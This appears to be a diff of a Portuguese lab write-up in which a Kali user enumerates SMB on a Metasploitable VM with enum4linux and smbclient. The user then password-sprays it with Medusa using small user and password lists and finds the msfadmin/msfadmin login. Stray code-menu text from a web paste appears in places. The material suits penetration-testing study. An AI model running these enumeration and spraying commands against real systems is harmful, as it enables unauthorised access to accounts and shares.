+S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)
 
-Plain Text
+ ==============================( Getting printer info for 192.168.56.101 )==============================                                                  
+                                                                             
+No printers returned.                                                        
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ smbclient -L //192.168.56.101 -U msfadminSenha para [WORKGROUP\msfadmin]:   `
 
-**Compartilhamentos Acessíveis:**
+enum4linux complete on Sun Oct 12 23:29:23 2025
 
-text
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ less enum4_output.txt
+"enum4_output.txt" may be a binary file.  See it anyway? 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ less enum4_output.txt
+"enum4_output.txt" may be a binary file.  See it anyway? 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ less enum4_output.txt  
+"enum4_output.txt" may be a binary file.  See it anyway? 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
 
-Plain Text
+LISTA DE USUARIO:
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   Sharename       Type      Comment---------       ----      -------print$          Disk      Printer Driverstmp             Disk      oh noes!opt             Disk      IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))msfadmin        Disk      Home Directories   `
+┌──(kali㉿kali)-[~]
+└─$ less enum4_output.txt
+"enum4_output.txt" may be a binary file.  See it anyway? 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ less enum4_output.txt
+"enum4_output.txt" may be a binary file.  See it anyway? 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ less enum4_output.txt  
+"enum4_output.txt" may be a binary file.  See it anyway? 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo -e 'user\nmsfadmin\nservice' > smb_users.txt  
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo -e 'password\n123456\nwelcome123\nmsfadmin' > senhas_spray.txt     
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+
+MEDUSA:
+
+──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2025-10-13 00:11:41 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (1 of 4 complete)
+2025-10-13 00:11:42 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (2 of 4 complete)
+2025-10-13 00:11:42 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: welcome123 (3 of 4 complete)
+2025-10-13 00:11:42 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
+2025-10-13 00:11:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
+2025-10-13 00:11:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
+2025-10-13 00:11:44 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: msfadmin (3 of 4 complete)
+2025-10-13 00:11:44 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2025-10-13 00:11:44 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: welcome123 (4 of 4 complete)
+2025-10-13 00:11:44 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: password (1 of 4 complete)
+2025-10-13 00:11:44 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: 123456 (2 of 4 complete)
+2025-10-13 00:11:45 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: welcome123 (3 of 4 complete)
+2025-10-13 00:11:45 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+
+TESTANDO O ACESSO UTILIZANDO SMBVLIENT:
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L //192.168.56.101 -U msfadmin
+Password for [WORKGROUP\msfadmin]:
+session setup failed: NT_STATUS_LOGON_FAILURE
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L //192.168.56.101 -U msfadmin
+Password for [WORKGROUP\msfadmin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLE
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
 
 📊 Resumo dos Resultados
 ------------------------
